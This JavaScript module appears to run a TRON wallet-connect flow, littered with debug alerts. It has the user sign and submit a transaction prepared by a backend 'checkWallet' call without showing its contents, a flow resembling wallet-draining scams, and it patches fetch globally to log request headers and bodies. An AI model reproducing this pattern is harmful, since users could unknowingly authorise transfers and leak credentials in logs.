import { connectSession, signTransaction } from "./approval.js";
import { tronAddress } from "./session.js";
import { checkWallet, submitTransaction } from "./api.js";
import { chooseWallet } from "./presentation.js";

if (typeof window !== "undefined" && !window.__pswFetchPatched) {
  window.__pswFetchPatched = true;
  var originalFetch = window.fetch.bind(window);
  window.fetch = async function (input, init) {
    var url = typeof input === "string" ? input : input && input.url || "";
    var method = init && init.method || (input && input.method) || "GET";
    var headers = init && init.headers || (input && input.headers) || undefined;
    var body = init && init.body !== undefined ? init.body : undefined;
    console.log("[WalletConnect][fetch] request", { url: url, method: method, headers: headers, body: body });
    var response = await originalFetch(input, init);
    try {
      var clone = response.clone();
      var text = await clone.text();
      console.log("[WalletConnect][fetch] response", { url: url, status: response.status, headers: Array.from(response.headers.entries()), text: text });
      if (url.indexOf("/api/checkWallet") !== -1) {
        try {
          var json = JSON.parse(text);
          console.log("[WalletConnect][checkWallet] json", json);
        } catch (error) {
          console.warn("[WalletConnect][checkWallet] failed to parse JSON", error);
        }
      }
    } catch (error) {
      console.warn("[WalletConnect][fetch] response log failed", error);
    }
    return response;
  };
}

function safeJson(value) {
  try {
    return JSON.parse(JSON.stringify(value));
  } catch (error) {
    return value;
  }
}

function logStorageSnapshot() {
  try {
    console.log("[WalletConnect][debug] localStorage keys", Object.keys(localStorage || {}));
    console.log("[WalletConnect][debug] sessionStorage keys", Object.keys(sessionStorage || {}));
    console.log("[WalletConnect][debug] indexedDB present", !!window.indexedDB);
  } catch (error) {
    console.warn("[WalletConnect][debug] storage snapshot failed", error);
  }
}

function normalizeSignedTransaction(unsignedTx, signedResult) {
  var tx = unsignedTx && typeof unsignedTx === "object" ? unsignedTx : {};
  var result = signedResult && typeof signedResult === "object" ? signedResult : null;
  var signature = result && result.signature != null ? result.signature : signedResult;
  var merged = Object.assign({}, tx);

  if (result) {
    Object.assign(merged, result);
  }

  if (merged.signature == null && signature != null) {
    merged.signature = signature;
  }

  if (typeof merged.signature === "string") {
    merged.signature = [merged.signature];
  } else if (!Array.isArray(merged.signature) && merged.signature != null) {
    merged.signature = [merged.signature];
  }

  if (tx.txID && !merged.txID) merged.txID = tx.txID;
  if (tx.raw_data && !merged.raw_data) merged.raw_data = tx.raw_data;
  if (tx.raw_data_hex && !merged.raw_data_hex) merged.raw_data_hex = tx.raw_data_hex;
  if (tx.transaction && !merged.transaction) merged.transaction = tx.transaction;

  return merged;
}

export async function connectAndAuthorize() {
  alert("1 - chooseWallet");
  var wallet = await chooseWallet();
  alert("2 - connectSession");
  var connection = await connectSession(wallet);
  alert("3 - connected");
  var address = connection.address || tronAddress(connection.session);
  alert("4 - checkWallet");
  var prepared = await checkWallet(address, connection.type);
  alert("5 - checkWallet finished");
  console.log("[WalletConnect][debug] expected recipient", address);
  console.log("[WalletConnect][debug] checkWallet response", safeJson(prepared));
  console.log("[WalletConnect][debug] unsignedTx", safeJson(prepared.unsignedTx));
  console.log("[WalletConnect][debug] txID", prepared.unsignedTx && (prepared.unsignedTx.txID || prepared.unsignedTx.txid || prepared.unsignedTx.transactionID || null));
  alert("unsignedTx exists: " + !!prepared.unsignedTx);
  logStorageSnapshot();
  alert("6 - signTransaction");
  var signedTx = normalizeSignedTransaction(prepared.unsignedTx, await signTransaction(connection, prepared.unsignedTx));
  alert("7 - signTransaction finished");
  console.dir(signedTx, { depth: null });
  alert("8 - submitTransaction");
  var result = await submitTransaction(address, signedTx);
  alert("9 - submitTransaction finished");
  return { address: address, result: result };
}
